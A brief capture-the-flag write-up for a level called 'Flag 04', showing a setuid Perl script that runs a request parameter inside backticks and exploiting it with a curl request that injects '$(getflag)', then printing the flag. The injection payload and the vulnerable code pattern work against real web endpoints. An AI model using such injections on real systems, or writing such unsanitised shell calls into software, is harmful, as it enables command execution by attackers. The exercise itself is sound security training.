# Flag 04

```bash
$ ll
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout*
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*
-r-x------  1 level04 level04  675 Apr  3  2012 .profile*
```

Inside this exercice we have a Perl script, running a server on localhost:4747 and inside the code we have:

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

so if we sent something that can get executed inside the line "print `echo $y 2>&1`;" we can have the flag.

```bash
$ curl 'http://localhost:4747/level04.pl?x=$(getflag)'
ne2searoevaevoem4ov4ar8ap
```
